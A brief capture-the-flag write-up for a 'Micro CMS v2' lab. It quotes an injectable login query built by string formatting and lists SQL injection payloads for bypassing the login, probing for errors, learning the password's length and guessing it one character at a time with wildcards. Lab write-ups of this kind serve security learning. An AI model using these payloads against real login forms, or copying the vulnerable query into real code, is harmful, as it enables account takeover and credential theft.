# Micro CMS v2

## Login

In login username field you can inject SQL code

python
```
if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
```

Inject password

`' UNION SELECT 'test' -- `

## FLAGS

### #1

#### Detection mechnism

When you inject in the login username field the following `' or 1=1 -- `, the error message changes from `Unknown user` to `Invalid password`.

#### Fields length

With the following we can find the length of the field `' OR LENGTH(password)=8;`

#### Fields content

Via Frontend testing framework (Selenium) we can use the following SQL syntax to guess the username and password `' OR password LIKE BINARY '________'`. By knowing the length and using the MySQL wildcard character `_` we can make a dictionarry attack character per character.